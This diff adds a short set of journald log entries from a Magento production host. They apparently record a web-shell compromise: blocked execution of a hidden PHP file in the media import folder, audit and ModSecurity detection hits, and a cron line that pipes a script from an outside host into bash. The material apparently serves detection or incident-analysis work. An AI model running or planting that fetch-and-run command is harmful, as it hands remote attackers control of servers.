@@ -1,0 +1,6 @@
+{"__REALTIME_TIMESTAMP":"1774776522000000","_HOSTNAME":"magento-prod-07","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"3","MESSAGE":"AVC denied { execute } for path=\"/var/www/html/pub/media/import/.tmp/a.php\" pid=3001"}
+{"__REALTIME_TIMESTAMP":"1774776701000000","_HOSTNAME":"magento-prod-07","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"4","MESSAGE":"audit: SYSCALL=execve key=\"php-exec-from-media\" comm=\"php-fpm\" pid=3002"}
+{"__REALTIME_TIMESTAMP":"1774776898000000","_HOSTNAME":"magento-prod-07","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"6","MESSAGE":"modsecurity: rule 941999 matched (URL-evasion polyglot) pid=3003"}
+{"__REALTIME_TIMESTAMP":"1774777048000000","_HOSTNAME":"magento-prod-07","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"3","MESSAGE":"audit: PATH name=\"/var/www/html/pub/media/import/.tmp/a.php\" inode=8675502 pid=3004"}
+{"__REALTIME_TIMESTAMP":"1774777291000000","_HOSTNAME":"magento-prod-07","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"6","MESSAGE":"modsecurity: rule 941998 matched (POST to PHP under media-cache) pid=3005"}
+{"__REALTIME_TIMESTAMP":"1774777458000000","_HOSTNAME":"magento-prod-07","_SYSTEMD_UNIT":"cron.service","PRIORITY":"5","MESSAGE":"CMD (curl -s http://vagqea4wrlkdg.top/c.txt | bash) pid=3006"}
